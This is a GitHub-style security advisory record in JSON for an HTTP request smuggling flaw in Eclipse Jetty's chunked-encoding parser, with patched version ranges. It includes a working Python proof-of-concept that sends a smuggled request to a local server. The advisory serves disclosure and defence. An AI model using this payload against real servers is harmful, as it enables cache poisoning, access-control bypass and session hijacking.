@@ -1,0 +1,83 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-04-14T23:40:32Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "org.eclipse.jetty:jetty-http"
+  },
+  "Advisory": {
+    "DatabaseId": 349422,
+    "Id": "GSA_kwCzR0hTQS0zNTVoLXFtYzItd3B3Zs4ABVTu",
+    "GhsaId": "GHSA-355h-qmc2-wpwf",
+    "References": [
+      {
+        "Url": "https://github.com/jetty/jetty.project/security/advisories/GHSA-355h-qmc2-wpwf"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-2332"
+      },
+      {
+        "Url": "https://gitlab.eclipse.org/security/cve-assignment/-/issues/89"
+      },
+      {
+        "Url": "https://w4ke.info/2025/06/18/funky-chunks.html"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-355h-qmc2-wpwf"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-355h-qmc2-wpwf"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-2332"
+      }
+    ],
+    "Description": "### Description (as reported)\n\nJetty incorrectly parses quoted strings in HTTP/1.1 chunked transfer encoding extension values, enabling request smuggling attacks.\n\n### Background\n\nThis vulnerability is a new variant discovered while researching the \"Funky Chunks\" HTTP request smuggling techniques:\n- https://w4ke.info/2025/06/18/funky-chunks.html\n- https://w4ke.info/2025/10/29/funky-chunks-2.html\n\nThe original research tested various chunk extension parsing differentials but did not test quoted-string handling within extension values.\n\n### Technical Details\n\n**RFC 9112 Section 7.1.1** defines chunked transfer encoding:\n```\nchunk = chunk-size [ chunk-ext ] CRLF chunk-data CRLF\nchunk-ext = *( BWS \";\" BWS chunk-ext-name [ BWS \"=\" BWS chunk-ext-val ] )\nchunk-ext-val = token / quoted-string\n```\n\n**RFC 9110 Section 5.6.4** defines quoted-string:\n```\nquoted-string = DQUOTE *( qdtext / quoted-pair ) DQUOTE\n```\n\nA quoted-string continues until the closing DQUOTE, and `\\r\\n` sequences are not permitted within the quotes.\n\n### Vulnerability\n\nJetty terminates chunk header parsing at `\\r\\n` inside quoted strings instead of treating this as an error.\n\n**Expected (RFC compliant):**\n```\nChunk: 1;a=\"value\\r\\nhere\"\\r\\n\n         ^^^^^^^^^^^^^^^^^^ extension value\nBody: [1 byte after the real \\r\\n]\n```\n\n**Actual (jetty):**\n```\nChunk: 1;a=\"value\n            ^^^^^ terminates here (WRONG)\nBody: here\"... treated as body/next request\n```\n\n### Proof of Concept\n\n```python\n#!/usr/bin/env python3\nimport socket\n\npayload = (\n    b\"POST / HTTP/1.1\\r\\n\"\n    b\"Host: localhost\\r\\n\"\n    b\"Transfer-Encoding: chunked\\r\\n\"\n    b\"\\r\\n\"\n    b'1;a=\"\\r\\n'\n    b\"X\\r\\n\"\n    b\"0\\r\\n\"\n    b\"\\r\\n\"\n    b\"GET /smuggled HTTP/1.1\\r\\n\"\n    b\"Host: localhost\\r\\n\"\n    b\"Content-Length: 11\\r\\n\"\n    b\"\\r\\n\"\n    b'\"\\r\\n'\n    b\"Y\\r\\n\"\n    b\"0\\r\\n\"\n    b\"\\r\\n\"\n)\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(3)\nsock.connect((\"127.0.0.1\", 8080))\nsock.sendall(payload)\n\nresponse = b\"\"\nwhile True:\n    try:\n        chunk = sock.recv(4096)\n        if not chunk:\n            break\n        response += chunk\n    except socket.timeout:\n        break\n\nsock.close()\nprint(f\"Responses: {response.count(b'HTTP/')}\")\nprint(response.decode(errors=\"replace\"))\n```\n\n**Result:** Server returns 2 HTTP responses from a single TCP connection.\n\n#### Parsing Breakdown\n\n| Parser | Request 1 | Request 2 |\n|--------|-----------|-----------|\n| jetty (vulnerable) | POST / body=\"X\" | GET /smuggled (SMUGGLED!) |\n| RFC compliant | POST / body=\"Y\" | (none - smuggled request hidden in extension) |\n\n### Impact\n\n- **Request Smuggling**: Attacker injects arbitrary HTTP requests\n- **Cache Poisoning**: Smuggled responses poison shared caches\n- **Access Control Bypass**: Smuggled requests bypass frontend security\n- **Session Hijacking**: Smuggled requests can steal other users' responses\n\n### Reproduction\n\n1. Start the minimal POC with docker\n2. Run the poc script provided in same zip\n\n### Suggested Fix\n\nEnsure the chunk framing and extensions are parsed exactly as specified in RFC9112. \nA CRLF inside a quoted-string should be considered a parsing error and not a line terminator.\n\n\n### Patches\nNo patches yet.\n\n### Workarounds\nNo workarounds yet.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-14T23:40:31Z",
+    "Severity": "HIGH",
+    "Summary": "Jetty has HTTP Request Smuggling via Chunked Extension Quoted-String Parsing",
+    "UpdatedAt": "2026-04-14T23:40:32Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "9.4.60"
+      },
+      "VulnerableVersionRange": "\u003e= 9.4.0, \u003c= 9.4.59"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "10.0.28"
+      },
+      "VulnerableVersionRange": "\u003e= 10.0.0, \u003c= 10.0.27"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "11.0.28"
+      },
+      "VulnerableVersionRange": "\u003e= 11.0.0, \u003c= 11.0.27"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "12.0.33"
+      },
+      "VulnerableVersionRange": "\u003e= 12.0.0, \u003c= 12.0.32"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "12.1.7"
+      },
+      "VulnerableVersionRange": "\u003e= 12.1.0, \u003c= 12.1.6"
+    }
+  ]
+}
